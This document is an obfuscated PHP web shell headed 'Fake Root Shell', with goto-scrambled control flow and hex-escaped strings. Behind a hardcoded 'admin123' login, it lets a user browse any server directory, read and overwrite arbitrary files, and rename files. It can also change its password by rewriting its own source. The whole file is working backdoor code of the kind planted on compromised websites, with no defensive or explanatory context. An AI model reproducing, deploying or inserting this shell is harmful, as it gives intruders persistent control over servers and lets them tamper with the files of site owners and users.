<?php
 goto xAlWQ; wOhyJ: echo "\x3c\165\154\76"; goto j1u9M; Gf8Vc: function displayRenameForm($old_name, $is_directory) { ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Rename <?php  echo $is_directory ? "\x44\151\x72\145\x63\164\157\x72\171" : "\106\x69\x6c\x65"; ?>
</title>
        <style>
            body {
                font-family: Arial, sans-serif;
            }
            .rename-container {
                max-width: 300px;
                margin: 20px auto;
                padding: 20px;
                border: 1px solid #ccc;
                border-radius: 5px;
                background: #aebdb3;
            }
            .rename-container h2 {
                text-align: center;
            }
            .rename-container input[type="text"],
            .rename-container input[type="submit"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
            }
        </style>
    </head>
    <body>
        <div class="rename-container">
            <h2>Rename <?php  echo $is_directory ? "\x44\151\x72\x65\143\x74\157\x72\171" : "\106\x69\x6c\x65"; ?>
</h2>
            <form method="post" action="">
                <input type="text" name="new_name" placeholder="Enter New Name" required>
                <input type="hidden" name="old_name" value="<?php  echo htmlspecialchars($old_name); ?>
">
                <input type="submit" value="Rename">
            </form>
        </div>
    </body>
    </html>
    <?php  die; } goto UqOWQ; xjOX4: if ($path === false) { $path = getcwd(); } goto KTOIt; kIQL5: if (isset($_GET["\162\x65\156\x61\x6d\x65"]) && isLoggedIn()) { $old_name = $_GET["\x72\x65\156\x61\155\x65"]; displayRenameForm($old_name, is_dir($old_name)); } goto QkD2q; tdus6: function displayRenameResult($rename_success, $rename_error) { if (isset($rename_success)) { echo "\x3c\160\40\143\x6c\141\x73\163\x3d\47\x73\165\143\143\145\163\163\x27\76" . htmlspecialchars($rename_success) . "\74\x2f\160\x3e"; } elseif (isset($rename_error)) { echo "\x3c\160\40\143\154\141\x73\163\75\x27\x65\162\x72\x6f\162\x27\76" . htmlspecialchars($rename_error) . "\x3c\57\160\x3e"; } } goto BCsMn; QkD2q: if (isset($_GET["\146\151\154\x65\x5f\145\144\x69\164"]) && isLoggedIn()) { $file_to_edit = $_GET["\x66\151\x6c\x65\137\x65\x64\151\164"]; displayEditFileForm($file_to_edit); } goto Btik0; I7TGs: function isLoggedIn() { return isset($_SESSION["\154\157\147\147\x65\x64\x69\x6e"]) && $_SESSION["\x6c\x6f\x67\x67\x65\144\x69\156"] === true; } goto JlikA; GQamn: $path = isset($_GET["\x70\x61\x74\150"]) ? $_GET["\160\141\164\x68"] : getcwd(); goto AD4tL; j1u9M: foreach ($scand as $file) { if ($file === "\x2e" || $file === "\x2e\x2e") { continue; } $filePath = $path . DIRECTORY_SEPARATOR . $file; if (is_dir($filePath)) { echo "\x3c\x6c\151\76\74\141\x20\143\x6c\x61\x73\x73\75\x27\164\x65\x78\164\x2d\144\x65\143\157\x72\141\164\x69\157\x6e\55\x6e\157\156\x65\40\x74\x65\170\164\55\154\151\147\x68\164\x27\x20\150\162\x65\146\x3d\47\x3f\x70\141\x74\150\x3d" . urlencode($filePath) . "\47\x3e" . htmlspecialchars($file) . "\x2f\74\x2f\141\x3e\x20"; echo "\x3c\141\x20\143\x6c\x61\163\163\75\x27\x74\145\x78\164\x2d\x64\x65\x63\x6f\x72\x61\164\x69\157\x6e\55\156\157\x6e\145\x20\x74\145\x78\164\55\x6c\151\147\x68\x74\x27\40\x68\162\145\146\x3d\47" . $_SERVER["\120\x48\x50\x5f\123\105\x4c\106"] . "\x3f\x70\x61\x74\x68\75" . urlencode(dirname($filePath)) . "\x26\162\145\x6e\x61\x6d\x65\x3d" . urlencode($file) . "\47\x3e\122\145\x6e\x61\155\x65\74\x2f\x61\76\x3c\x2f\x6c\x69\76"; } else { echo "\x3c\154\151\x3e" . htmlspecialchars($file) . "\40"; echo "\x3c\x61\40\x63\x6c\141\x73\163\x3d\47\x74\145\170\164\x2d\x64\145\x63\x6f\162\x61\x74\151\x6f\x6e\55\x6e\157\156\x65\40\164\145\170\164\55\154\x69\147\x68\164\x27\x20\150\162\x65\x66\x3d\x27" . $_SERVER["\x50\x48\120\x5f\123\x45\114\106"] . "\x3f\x66\151\154\145\x5f\x65\x64\151\164\75" . urlencode($filePath) . "\47\x3e\x45\x64\151\164\x3c\57\141\x3e\40"; echo "\x3c\x61\40\143\x6c\x61\x73\163\x3d\47\164\145\x78\x74\x2d\x64\x65\143\157\162\x61\x74\151\157\x6e\55\156\x6f\x6e\x65\40\x74\145\170\x74\x2d\x6c\x69\147\x68\x74\x27\40\150\x72\145\x66\x3d\x27" . $_SERVER["\120\110\120\x5f\123\105\x4c\x46"] . "\x3f\x70\x61\x74\x68\x3d" . urlencode(dirname($filePath)) . "\x26\162\145\156\141\x6d\x65\x3d" . urlencode($file) . "\x27\76\122\x65\156\x61\155\x65\x3c\x2f\x61\76\74\57\x6c\151\76"; } } goto t1WhR; VVbIb: echo "\74\x61\x20\143\154\x61\x73\x73\x3d\x27\x74\x65\170\164\55\x64\145\143\x6f\162\141\164\151\157\156\x2d\156\157\156\145\40\x74\x65\170\x74\x2d\x6c\151\147\x68\164\x27\40\150\x72\x65\146\75\47" . $_SERVER["\x50\110\120\x5f\123\105\x4c\106"] . "\77\143\x68\x61\156\147\x65\137\x70\x61\163\163\x77\x6f\x72\x64\75\164\x72\x75\145\x27\x3e\x3c\x68\x31\x3e\x43\x68\x61\156\147\x65\40\120\141\x73\163\167\157\162\144\x3c\57\150\61\76\74\x2f\x61\x3e"; goto k59xi; wb3R6: if (isset($_GET["\143\150\141\156\147\x65\x5f\160\x61\163\x73\x77\157\x72\x64"]) && isLoggedIn()) { ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Change Password</title>
        <style>
            body {
                font-family: Arial, sans-serif;
            }
            .password-change-container {
                max-width: 300px;
                margin: 20px auto;
                padding: 20px;
                border: 1px solid #ccc;
                border-radius: 5px;
                background: #aebdb3;
            }
            .password-change-container h2 {
                text-align: center;
            }
            .password-change-container input[type="password"],
            .password-change-container input[type="submit"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
            }
            .success, .error {
                text-align: center;
            }
            .success {
                color: green;
            }
            .error {
                color: red;
            }
        </style>
    </head>
    <body>
        <div class="password-change-container">
            <h2>Change Password</h2>
            <?php  if (isset($password_change_success)) { ?>
                <p class="success"><?php  echo htmlspecialchars($password_change_success); ?>
</p>
            <?php  } elseif (isset($password_change_error)) { ?>
                <p class="error"><?php  echo htmlspecialchars($password_change_error); ?>
</p>
            <?php  } ?>
            <form method="post" action="">
                <input type="password" name="new_password" placeholder="Enter New Password" required>
                <input type="submit" value="Change Password">
            </form>
        </div>
    </body>
    </html>
    <?php  die; } goto Gf8Vc; xAlWQ: session_start(); goto WD6by; ntobE: $paths = explode("\x2f", $path); goto XkrNT; t1WhR: echo "\x3c\57\x75\x6c\76"; goto kIQL5; dyEzR: if ($_SERVER["\x52\105\x51\125\105\x53\124\137\x4d\x45\124\x48\117\x44"] === "\120\x4f\123\124" && isset($_POST["\156\x65\167\137\156\x61\155\x65"]) && isset($_POST["\157\x6c\144\x5f\156\x61\x6d\145"]) && isLoggedIn()) { $old_name = $_POST["\x6f\x6c\144\137\156\141\155\x65"]; $new_name = $_POST["\x6e\x65\x77\x5f\156\141\155\145"]; if (rename($old_name, dirname($old_name) . "\57" . $new_name)) { $rename_success = "\x42\145\162\150\141\163\x69\154\x20\155\145\156\x67\165\x62\x61\x68\x20\x6e\141\x6d\x61\x2e"; } else { $rename_error = "\107\141\x67\x61\154\x20\155\x65\x6e\147\x75\x62\141\x68\40\x6e\x61\x6d\x61\x2e"; } } goto Mme1S; ijGk3: $correct_password = "\x61\144\x6d\x69\x6e\61\x32\63"; goto I7TGs; wAG2w: if (!isLoggedIn()) { ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <style>
            body {
                font-family: Arial, sans-serif;
            }
            .login-container {
                max-width: 300px;
                margin: 0 auto;
                padding: 20px;
                border: 1px solid #ccc;
                border-radius: 5px;
                background: #aebdb3;
            }
            .login-container h2 {
                text-align: center;
            }
            .login-container input[type="password"],
            .login-container input[type="submit"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
            }
            .error {
                color: red;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Login</h2>
            <?php  if (isset($login_error)) { ?>
                <p class="error"><?php  echo htmlspecialchars($login_error); ?>
</p>
            <?php  } ?>
            <form method="post" action="">
                <input type="password" name="password" placeholder="Enter Password" required>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>
    <?php  die; } goto wb3R6; k59xi: foreach ($paths as $id => $pat) { if ($pat == '' && $id == 0) { echo "\x3c\151\x20\x63\154\141\x73\x73\x3d\x27\x62\x69\x20\x62\x69\x2d\150\144\x64\55\162\x61\x63\x6b\x27\76\74\57\151\76\x3a\74\x61\40\x63\x6c\x61\x73\x73\75\47\x74\x65\170\x74\x2d\144\145\x63\x6f\162\141\164\x69\x6f\156\x2d\156\157\156\x65\x20\x74\145\170\164\55\154\x69\147\150\164\x27\x20\x68\x72\145\x66\x3d\47\x3f\160\141\164\x68\75\x2f\47\76\x2f\74\x2f\141\x3e"; continue; } if ($pat == '') { continue; } echo "\74\x61\x20\143\x6c\141\x73\163\x3d\x27\x74\x65\170\x74\x2d\144\145\x63\157\x72\x61\x74\x69\x6f\x6e\55\x6e\157\x6e\x65\x20\164\x65\x78\x74\x2d\154\x69\147\150\x74\47\x20\150\162\145\146\x3d\47\x3f\x70\x61\164\150\x3d"; for ($i = 0; $i <= $id; $i++) { echo htmlspecialchars($paths[$i]); if ($i != $id) { echo "\57"; } } echo "\47\76" . htmlspecialchars($pat) . "\x3c\x2f\141\76\x2f"; } goto ECFz1; TEJRB: function changePassword($new_password) { global $correct_password; $script_content = getScriptContent(); $new_script_content = preg_replace("\57\x28\134\x24\143\157\x72\162\145\x63\x74\137\160\141\x73\163\167\157\162\x64\x5c\163\52\75\134\x73\x2a\x5c\42\51\133\136\x5c\42\x5d\x2b\x28\x5c\42\x29\57", "\x24\x31" . addslashes($new_password) . "\x24\x32", $script_content); saveScriptContent($new_script_content); $_SESSION["\143\x6f\162\x72\x65\x63\164\137\x70\141\163\163\167\x6f\162\x64"] = $new_password; $correct_password = $new_password; } goto EsIjF; BCsMn: function displayEditFileResult($file_edit_success, $file_edit_error) { if (isset($file_edit_success)) { echo "\74\160\x20\x63\154\x61\x73\x73\x3d\47\163\x75\143\143\145\163\163\47\76" . htmlspecialchars($file_edit_success) . "\74\x2f\160\x3e"; } elseif (isset($file_edit_error)) { echo "\x3c\160\40\x63\x6c\x61\x73\163\x3d\x27\x65\162\162\157\162\x27\x3e" . htmlspecialchars($file_edit_error) . "\x3c\x2f\x70\x3e"; } } goto dyEzR; UqOWQ: function displayEditFileForm($file_to_edit) { $file_content = file_get_contents($file_to_edit); ?>
    <!DOCTYPE html>
<?php  goto pSX0W; dSi0z: ?>
</textarea> <input type="hidden"value="<?php  goto uPNTj; pSX0W: ?>
<html lang="en"><head><meta charset="UTF-8"><title>Edit File:<?php  goto poUiw; GCa2F: ?>
</title><style>body{font-family:Arial,sans-serif}.file-edit-container{max-width:600px;margin:20px auto;padding:20px;border:1px solid #ccc;border-radius:5px;background:#aebdb3}.file-edit-container h2{text-align:center}.file-edit-container textarea{width:100%;height:400px;padding:10px;margin:10px 0;font-family:monospace;border:1px solid #ccc;border-radius:5px}.file-edit-container input[type=submit]{display:block;width:100%;padding:10px;margin-top:10px}</style></head><body><div class="file-edit-container"><h2>Edit File:<?php  goto p1PWV; p1PWV: echo htmlspecialchars(basename($file_to_edit)); goto JfnA9; poUiw: echo htmlspecialchars(basename($file_to_edit)); goto GCa2F; uPNTj: echo htmlspecialchars($file_to_edit); goto hT_Cr; JfnA9: ?>
</h2><form action=""method="post"><textarea name="file_content"><?php  goto B47CN; B47CN: echo htmlspecialchars($file_content); goto dSi0z; hT_Cr: ?>
"name="file_to_edit"> <input type="submit"value="Save Changes"></form></div></body></html>
    <?php  die; } goto tdus6; AD4tL: $path = realpath($path); goto xjOX4; DW4rX: function saveScriptContent($content) { file_put_contents(__FILE__, $content); } goto ijGk3; ECFz1: $scand = scandir($path); goto wOhyJ; JlikA: function handleLogin($password) { global $correct_password; if ($password === $correct_password) { $_SESSION["\x6c\157\x67\147\145\144\x69\x6e"] = true; return true; } return false; } goto TEJRB; EsIjF: if ($_SERVER["\122\105\x51\x55\105\123\124\137\x4d\105\124\x48\x4f\104"] === "\120\117\123\124" && isset($_POST["\x70\x61\163\x73\x77\x6f\162\x64"]) && !isLoggedIn()) { if (handleLogin($_POST["\x70\141\x73\163\167\157\x72\x64"])) { header("\114\157\x63\x61\164\x69\x6f\x6e\x3a\x20" . $_SERVER["\120\110\x50\x5f\x53\105\114\106"]); die; } else { $login_error = "\x50\x61\163\x73\x77\157\162\x64\40\x73\141\154\141\150\x21"; } } goto EPcgZ; INaFU: displayEditFileResult($file_edit_success, $file_edit_error); goto NYC_W; Mme1S: if ($_SERVER["\x52\105\x51\125\x45\123\124\137\x4d\x45\x54\110\117\x44"] === "\120\117\x53\124" && isset($_POST["\x66\x69\x6c\x65\x5f\143\x6f\156\164\145\x6e\x74"]) && isset($_POST["\146\151\154\145\137\164\x6f\x5f\x65\x64\151\164"]) && isLoggedIn()) { $file_to_edit = $_POST["\x66\151\154\x65\137\x74\x6f\137\145\x64\x69\164"]; $new_content = $_POST["\146\151\154\x65\137\x63\157\156\x74\x65\x6e\164"]; if (file_put_contents($file_to_edit, $new_content) !== false) { $file_edit_success = "\102\145\162\150\x61\163\x69\x6c\x20\x6d\x65\x6e\x79\x69\x6d\160\141\156\x20\x70\x65\162\x75\x62\141\x68\141\156\56"; } else { $file_edit_error = "\x47\141\x67\141\154\40\155\x65\156\x79\x69\155\x70\x61\x6e\40\x70\x65\162\x75\x62\141\x68\141\156\56"; } } goto GQamn; Cr4RJ: $path = str_replace("\x5c", "\x2f", $path); goto ntobE; Btik0: displayRenameResult($rename_success, $rename_error); goto INaFU; EPcgZ: if ($_SERVER["\122\105\x51\125\105\123\x54\x5f\x4d\x45\124\x48\x4f\x44"] === "\120\x4f\123\x54" && isset($_POST["\x6e\x65\167\x5f\160\x61\x73\x73\167\157\x72\144"]) && isLoggedIn()) { $new_password = $_POST["\x6e\x65\167\137\160\x61\x73\x73\x77\157\x72\144"]; changePassword($new_password); $password_change_success = "\120\141\163\163\167\x6f\162\x64\x20\142\145\x72\x68\141\163\x69\x6c\40\x64\x69\147\141\x6e\x74\x69\41"; } goto wAG2w; KTOIt: chdir($path); goto Cr4RJ; WD6by: function getScriptContent() { return file_get_contents(__FILE__); } goto DW4rX; XkrNT: echo "\x3c\141\40\143\x6c\x61\x73\x73\75\x27\164\x65\x78\164\x2d\144\145\143\157\162\141\x74\x69\x6f\x6e\x2d\x6e\x6f\156\x65\40\x74\145\170\x74\x2d\x6c\151\x67\150\x74\x20\141\x6e\x75\x27\40\x68\x72\145\146\75\x27" . $_SERVER["\x50\x48\120\x5f\x53\x45\x4c\x46"] . "\x27\x3e\74\150\61\76\x2e\57\x46\141\x6b\145\40\122\x6f\157\164\x20\123\150\145\x6c\x6c\x3c\57\150\61\76\x3c\x2f\x61\76\40"; goto VVbIb; NYC_W: ?>